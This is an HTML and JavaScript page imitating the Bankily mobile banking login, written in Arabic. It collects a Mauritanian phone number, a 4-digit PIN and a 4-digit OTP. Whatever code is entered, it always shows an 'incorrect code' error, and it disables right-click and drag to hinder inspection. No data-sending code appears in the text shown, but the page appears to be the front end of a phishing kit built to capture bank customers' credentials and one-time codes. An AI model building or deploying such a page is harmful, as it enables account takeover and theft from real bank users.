<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bankily - بنكيلي</title>
    <style>
        :root {
            --primary-teal: #0093a2;
            --primary-yellow: #f8ba00;
            --bg-white: #ffffff;
        }

        * {
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        body {
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .app-container {
            width: 360px;
            height: 740px;
            background-color: var(--bg-white);
            border-radius: 24px;
            box-shadow: 0 12px 30px rgba(0,0,0,0.12);
            display: flex;
            flex-direction: column;
            overflow: hidden;
            position: relative;
        }

        .app-header {
            background-color: var(--primary-teal);
            height: 65px;
            display: none;
            align-items: center;
            justify-content: center;
            position: relative;
            color: white;
            font-size: 1.15rem;
            font-weight: 500;
        }

        .app-header .back-arrow {
            position: absolute;
            right: 20px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 1.4rem;
            cursor: pointer;
            font-weight: bold;
            display: none;
        }

        .app-content {
            flex: 1;
            padding: 15px 30px 10px 30px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .brand-logo-space {
            width: 100%;
            height: 160px; 
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 15px;
            margin-bottom: 25px;
        }

        .brand-logo-space img {
            max-width: 95%;
            max-height: 100%;
            object-fit: contain;
        }

        .middle-fields-container {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: auto;   
            margin-bottom: auto; 
        }

        .input-group {
            width: 100%;
            margin-bottom: 30px; 
            position: relative;
            text-align: right;
        }

        .input-group label {
            display: block;
            font-size: 0.95rem;
            font-weight: bold;
            color: #333;
            margin-bottom: 12px;
            padding-right: 5px;
        }

        .input-wrapper {
            position: relative;
            width: 100%;
            border-bottom: 1.5px solid #222;
            padding-bottom: 4px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .main-input {
            width: calc(100% - 35px);
            border: none;
            outline: none;
            padding: 4px 5px;
            font-size: 1.15rem;
            color: #333;
            background: transparent;
            direction: ltr !important;
            text-align: left !important;
        }

        .field-icon {
            width: 22px;
            height: 22px;
            color: #222;
            margin-right: 5px;
        }

        /* حاوية مرنة تضمن سحب أشرطة الرقم السري كاملة إلى اليمين تماماً */
        .password-wrapper-box {
            display: flex;
            justify-content: flex-start; 
            flex-direction: row-reverse;
            align-items: center;
            width: 100%;
        }

        .password-container {
            display: flex;
            gap: 15px;
        }

        .password-field {
            width: 28px;
            height: 30px;
            border: none;
            border-bottom: 2px solid #222;
            font-size: 1.4rem;
            font-weight: bold;
            outline: none;
            background: transparent;
            text-align: center !important; 
            direction: ltr !important;
            caret-color: #222 !important;
            border-radius: 0 !important;
        }

        .forgot-password-link {
            display: block;
            text-align: right;
            margin-top: 15px;
            padding-right: 5px;
        }

        .forgot-password-link a {
            color: #222;
            text-decoration: underline;
            font-size: 0.95rem;
            font-weight: 500;
        }

        .bottom-links-area {
            margin-top: auto;
            margin-bottom: 20px;
            width: 100%;
            text-align: center;
        }

        .register-link-box a {
            color: #222;
            text-decoration: underline;
            font-size: 0.9rem;
            font-weight: 500;
        }

        .otp-title {
            font-size: 0.95rem;
            font-weight: normal;
            color: #666;
            text-align: center;
            line-height: 1.7;
            margin-top: 25px;
            margin-bottom: 25px;
        }

        .otp-middle-container {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: auto;   
            margin-bottom: auto; 
        }

        .otp-wrapper-box {
            display: flex;
            justify-content: center;
            width: 100%;
            margin-bottom: 25px;
        }

        .otp-container {
            display: flex;
            gap: 15px;
            direction: ltr !important;
        }

        .otp-field {
            width: 28px;
            height: 30px;
            border: none;
            border-bottom: 2px solid #222;
            font-size: 1.4rem;
            font-weight: bold;
            outline: none;
            background: transparent;
            text-align: center !important;
            direction: ltr !important;
            caret-color: #222 !important; 
            border-radius: 0 !important;
        }

        .otp-timer-countdown {
            font-size: 1.1rem;
            font-weight: bold;
            color: #0c3e66;
            margin-bottom: 20px;
            text-align: center;
        }

        .footer-button {
            background-color: var(--primary-yellow);
            color: #ffffff;
            border: none;
            width: 100%;
            height: 60px;
            font-size: 1.2rem;
            font-weight: bold;
            cursor: pointer;
            outline: none;
        }

        .footer-button:active {
            opacity: 0.9;
        }

        .custom-popup-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.4);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .custom-popup-box {
            width: 280px;
            background-color: #ffffff;
            border-radius: 14px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
            overflow: hidden;
            text-align: center;
            animation: popupScale 0.2s ease-out;
        }

        @keyframes popupScale {
            from { transform: scale(0.9); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .popup-content-text {
            padding: 25px 20px;
            font-size: 1rem;
            color: #333333;
            line-height: 1.6;
        }

        .popup-content-text strong {
            display: block;
            font-size: 1.2rem;
            margin-bottom: 10px;
            color: #000;
        }

        .popup-close-btn {
            width: 100%;
            height: 50px;
            background-color: #1ed1db;
            color: #ffffff;
            border: none;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            outline: none;
        }

        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <div class="app-container">
        
        <div id="customErrorPopup" class="custom-popup-overlay hidden">
            <div class="custom-popup-box">
                <div class="popup-content-text">
                    <strong>خطأ</strong>
                    <span id="popupErrorMessage">رمز التأكيد الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى.</span>
                </div>
                <button class="popup-close-btn" onclick="closeErrorPopup()">تم</button>
            </div>
        </div>
        
        <div class="app-header" id="appHeader">
            <span class="back-arrow" id="backArrow" onclick="switchToLogin()">&#12296;</span>
            <span id="titleText"></span>
        </div>

        <div id="loginSection" class="app-content">
            
            <div class="brand-logo-space">
                <img src="logo_bankily.jpeg" alt="Bankily Logo">
            </div>

            <div class="middle-fields-container">
                <div class="input-group">
                    <label>اسم المستخدم أو رقم الهاتف</label>
                    <div class="input-wrapper">
                        <input type="text" id="usernameInput" class="main-input" maxlength="8" inputmode="numeric" oninput="handleUsernameInput(this)">
                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <circle cx="12" cy="12" r="10"/>
                            <path d="M18 19c0-2.21-2.69-4-6-4s-6 1.79-6 4"/>
                            <circle cx="12" cy="8" r="3"/>
                        </svg>
                    </div>
                </div>

                <div class="input-group" style="margin-bottom: 5px;">
                    <label>الرقم السري</label>
                    <div class="input-wrapper" style="border-bottom: none; padding-bottom: 0;">
                        <div class="password-wrapper-box">
                            <div class="password-container">
                                <input type="password" inputmode="numeric" pattern="[0-9]*" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 0)">
                                <input type="password" inputmode="numeric" pattern="[0-9]*" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 1)">
                                <input type="password" inputmode="numeric" pattern="[0-9]*" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 2)">
                                <input type="password" inputmode="numeric" pattern="[0-9]*" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 3)">
                            </div>
                            <div style="flex-grow: 1;"></div>
                            <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                                <path d="M7 11V7a5 5 0 0 1 9.9-1"/>
                            </svg>
                        </div>
                    </div>
                </div>
            </div>

            <div style="width: 100%;">
                <div class="forgot-password-link">
                    <a href="#">نسيت الرقم السري ؟</a>
                </div>
            </div>

            <div class="bottom-links-area">
                <div class="register-link-box">
                    <a href="#">مستخدم جديد ؟ سجل الآن!</a>
                </div>
            </div>
        </div>

        <div id="otpSection" class="app-content hidden">
            <p class="otp-title">أدخل رمز التأكيد المرسل إلى هاتف المحمول</p>

            <div class="otp-middle-container">
                <div class="otp-wrapper-box">
                    <div class="otp-container">
                        <input type="password" inputmode="numeric" pattern="[0-9]*" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 0)">
                        <input type="password" inputmode="numeric" pattern="[0-9]*" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 1)">
                        <input type="password" inputmode="numeric" pattern="[0-9]*" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 2)">
                        <input type="password" inputmode="numeric" pattern="[0-9]*" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 3)">
                    </div>
                </div>

                <p class="otp-timer-countdown" id="otpTimer">05:00 ثواني</p>
            </div>

            <div class="register-link-box" style="margin-top: auto; margin-bottom: 15px;">
                <a href="#" style="color: #222; font-weight: 500;">إعادة إرسال رمز التأكيد</a>
            </div>
        </div>

        <button class="footer-button" id="submitBtn" onclick="onFooterButtonClick()">تسجيل الدخول</button>

    </div>

    <script>
        let otpInterval = null;
        let totalSeconds = 300; 

        document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
        document.addEventListener('mousedown', function(e) {
            if (e.button === 1 || e.button === 2) { e.preventDefault(); return false; }
        });

        function isValidMauritanianNetwork(number) {
            if (number.length === 0) return true;
            const firstDigit = number.charAt(0);
            return (firstDigit === '2' || firstDigit === '3' || firstDigit === '4');
        }

        function handleUsernameInput(input) {
            input.value = input.value.replace(/[^0-9]/g, ''); 
            
            if (input.value.length > 0 && !isValidMauritanianNetwork(input.value)) {
                showErrorPopup("عذراً! رقم الهاتف المدخل لا يتبع لأي من الشبكات المحلية المعتمدة (موريتل، ماتل، شنقيتل).");
                input.value = ""; 
                return;
            }

            if (input.value.length === 8) {
                const passFields = document.querySelectorAll('.password-field');
                if (passFields.length > 0) {
                    passFields[0].focus();
                }
            }
        }

        function handlePasswordNavigation(current, currentIndex) {
            current.value = current.value.replace(/[^0-9]/g, ''); 
            const fields = document.querySelectorAll('.password-field');
            if (current.value.length === 1 && currentIndex < 3) {
                fields[currentIndex + 1].focus();
            }
        }

        document.querySelectorAll('.password-field').forEach((field, index) => {
            field.addEventListener('keydown', (e) => {
                if (e.key === "Backspace" && field.value.length === 0 && index > 0) {
                    document.querySelectorAll('.password-field')[index - 1].focus();
                }
            });
            field.addEventListener('dragstart', (e) => e.preventDefault());
            field.addEventListener('drop', (e) => e.preventDefault());
        });

        function handleOtpNavigation(current, currentIndex) {
            current.value = current.value.replace(/[^0-9]/g, ''); 
            const fields = document.querySelectorAll('.otp-field');
            if (current.value.length === 1 && currentIndex < 3) {
                fields[currentIndex + 1].focus();
            }
        }

        document.querySelectorAll('.otp-field').forEach((field, index) => {
            field.addEventListener('keydown', (e) => {
                if (e.key === "Backspace" && field.value.length === 0 && index > 0) {
                    document.querySelectorAll('.otp-field')[index - 1].focus();
                }
            });
            field.addEventListener('dragstart', (e) => e.preventDefault());
            field.addEventListener('drop', (e) => e.preventDefault());
        });

        function startOtpTimer() {
            clearInterval(otpInterval);
            totalSeconds = 300; 
            updateTimerDisplay();

            otpInterval = setInterval(() => {
                if (totalSeconds <= 0) {
                    clearInterval(otpInterval);
                    document.getElementById('otpTimer').innerText = "00:00 ثواني";
                    return;
                }
                totalSeconds--;
                updateTimerDisplay();
            }, 1000);
        }

        function updateTimerDisplay() {
            const minutes = Math.floor(totalSeconds / 60);
            const seconds = totalSeconds % 60;
            const formattedMinutes = minutes < 10 ? '0' + minutes : minutes;
            const formattedSeconds = seconds < 10 ? '0' + seconds : seconds;
            document.getElementById('otpTimer').innerText = `${formattedMinutes}:${formattedSeconds} ثواني`;
        }

        function showErrorPopup(message) {
            document.getElementById('popupErrorMessage').innerText = message;
            document.getElementById('customErrorPopup').classList.remove('hidden');
        }

        function closeErrorPopup() {
            document.getElementById('customErrorPopup').classList.add('hidden');
        }

        function onFooterButtonClick() {
            const loginSection = document.getElementById('loginSection');
            const otpSection = document.getElementById('otpSection');
            const appHeader = document.getElementById('appHeader');
            const titleText = document.getElementById('titleText');
            const backArrow = document.getElementById('backArrow');
            const submitBtn = document.getElementById('submitBtn');

            if (!loginSection.classList.contains('hidden')) {
                const userVal = document.getElementById('usernameInput').value.trim();
                let passVal = "";
                document.querySelectorAll('.password-field').forEach(box => passVal += box.value.trim());

                if (userVal === "" || passVal === "") {
                    showErrorPopup("عذراً! لا يمكن ترك الحقول فارغة. الرجاء إدخال رقم الهاتف والرقم السري كاملاً.");
                    return;
                }
                if (userVal.length !== 8) {
                    showErrorPopup("يجب إدخال رقم الهاتف كاملاً والمكون من 8 أرقام.");
                    return;
                }
                if (!isValidMauritanianNetwork(userVal)) {
                    showErrorPopup("عذراً! رقم الهاتف المدخل لا يتبع لأي من الشبكات المحلية المعتمدة (موريتل، ماتل، شنقيتل).");
                    return;
                }
                if (passVal.length !== 4) {
                    showErrorPopup("يجب إدخال الرقم السري كاملاً والمكون من 4 أرقام.");
                    return;
                }

                loginSection.classList.add('hidden');
                otpSection.classList.remove('hidden');
                
                appHeader.style.display = "flex";
                titleText.innerText = "رمز التحقق";
                backArrow.style.display = "block";
                submitBtn.innerText = "التحقق";
                
                startOtpTimer();

                setTimeout(() => {
                    document.querySelectorAll('.otp-field')[0].focus();
                }, 100);
                
            } else {
                let otpCode = "";
                document.querySelectorAll('.otp-field').forEach(box => otpCode += box.value.trim());

                if (otpCode === "") {
                    showErrorPopup("الرجاء إدخال رمز التحقق (OTP) المرسل إلى هاتفك.");
                    return;
                }
                if (otpCode.length !== 4) {
                    showErrorPopup("الرجاء تعبئة حقل الـ OTP كاملاً (4 أرقام).");
                    return;
                }

                showErrorPopup("رمز التأكيد الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى.");
            }
        }

        function switchToLogin() {
            clearInterval(otpInterval);
            document.getElementById('loginSection').classList.remove('hidden');
            document.getElementById('otpSection').classList.add('hidden');
            document.getElementById('appHeader').style.display = "none";
            document.getElementById('titleText').innerText = ""; 
            document.getElementById('backArrow').style.display = "none";
            document.getElementById('submitBtn').innerText = "تسجيل الدخول";
        }
    </script>
</body>
</html>
